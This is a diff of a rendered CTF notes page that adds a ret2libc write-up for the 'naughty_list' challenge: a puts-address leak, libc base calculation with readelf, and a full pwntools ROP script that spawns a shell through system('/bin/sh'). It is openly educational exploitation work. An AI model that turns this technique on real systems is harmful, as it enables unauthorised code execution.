@@ -678,7 +678,67 @@ io.interactive()
 leak = pwn.unpack(io.recvline()[:6].ljust(8, b&quot;\x00&quot;))
 pwn.log.info(f&quot;Leaked address {hex(leak)}&quot;)
 </code></pre>
-<p>Running our script now shows that we indeed leak the <code>puts</code> function address properly ! </p>
+<p>Running our script now shows that we indeed leak the <code>puts</code> function address properly, and that we were able to store it in a variable called <code>leak</code>.</p>
+<p>Now to calculate the <code>libc base address</code>, we can substract the offset of the <code>puts</code> function in libc to the address of <code>puts</code> we leaked, this should give us the base address. To find an offset we are going to use the readelf utility.</p>
+<pre><code>readelf -s ./libc.so.6 | grep GLIBC | grep puts
+   191: 0000000000080aa0   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
+   422: 0000000000080aa0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
+   496: 0000000000126550  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
+   678: 0000000000128460   750 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
+   1141: 000000000007f2d0   396 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
+</code></pre>
+<p>We see that the <code>puts</code> function as an offset of <code>0000000000080aa0</code> in <code>libc</code>, let's add the following to our script.</p>
+<pre><code class="language-py">puts_libc_offset = 0x0000000000080aa0
+libc.address = leak - puts_libc_offset
+pwn.log.info(f&quot;Base address of libc : {hex(libc.address)}&quot;)
+</code></pre>
+<p>Next we can create a <code>ROP</code> object and exploit the program using a call to <code>system(&quot;/bin/sh&quot;)</code>, this is pretty simple to do. Add the following to your script. <em>Note that for an obscure reason, the pop_rdi didn't worked with the second payload, so i used a single ret instead and it worked well</em></p>
+<pre><code class="language-py">rop = pwn.ROP(libc)
+rop.system(next(libc.search(b&quot;/bin/sh\x00&quot;)))
+io.sendline(pwn.flat({PADDING: [ret, rop.chain()]}))
+</code></pre>
+<p>You should have now the following code in your script.</p>
+<pre><code class="language-py">import pwn
+
+e = pwn.ELF(&quot;./naughty_list&quot;, checksec=False)
+libc = pwn.ELF(&quot;libc.so.6&quot;, checksec=False)
+io = pwn.process(e.path)
+pwn.context.arch = &quot;amd64&quot;
+PADDING = 40
+
+pop_rdi = pwn.p64(0x0000000000401443)
+ret = pwn.p64(0x0000000000400756)
+puts_at_got = pwn.p64(e.got.puts)
+puts_at_plt = pwn.p64(e.plt.puts)
+get_descr = pwn.p64(e.symbols.get_descr)
+
+payload = [
+    b&quot;A&quot;*PADDING,
+    pop_rdi,
+    puts_at_got,
+    puts_at_plt,
+    get_descr
+]
+
+io.sendlineafter(b&quot;:&quot;, b&quot;PENIS&quot;)
+io.sendlineafter(b&quot;:&quot;, b&quot;PENIS&quot;)
+io.sendlineafter(b&quot;:&quot;, b&quot;69&quot;)
+io.sendlineafter(b&quot;:&quot;, b&quot;&quot;.join(payload))
+
+io.recvlines(6)
+leak = pwn.unpack(io.recvline()[:6].ljust(8, b&quot;\x00&quot;))
+pwn.log.info(f&quot;Leaked address {hex(leak)}&quot;)
+
+puts_libc_offset = 0x080aa0
+libc.address = leak - puts_libc_offset
+pwn.log.info(f&quot;Base address of libc : {hex(libc.address)}&quot;)
+
+rop = pwn.ROP(libc)
+rop.system(next(libc.search(b&quot;/bin/sh\x00&quot;)))
+io.sendlineafter(b&quot;:&quot;, pwn.flat({PADDING: [ret, rop.chain()]}))
+io.interactive()
+</code></pre>
+<p>Running it either locally or remotely on a vulnerable machine drops us a shell, you can read the flag in the flag.txt file ! Hopefully you enjoyed the challenge and the writeup.</p>
 <div style="break-before: page; page-break-before: always;"></div><h1 id="anatomy-of-a-gopher"><a class="header" href="#anatomy-of-a-gopher">Anatomy of a Gopher</a></h1>
 <p>This sections are my notes relating the SANS talk &quot;Anatomy of a Gopher&quot;, by hex0punk (Alex Useche). The talk is still available on youtube at the following link <a href="%22https://www.youtube.com/watch?v=wWNbnEp_4ZE%22">talk</a>.</p>
 <h2 id="what-are-we-doing"><a class="header" href="#what-are-we-doing">What are we doing</a></h2>
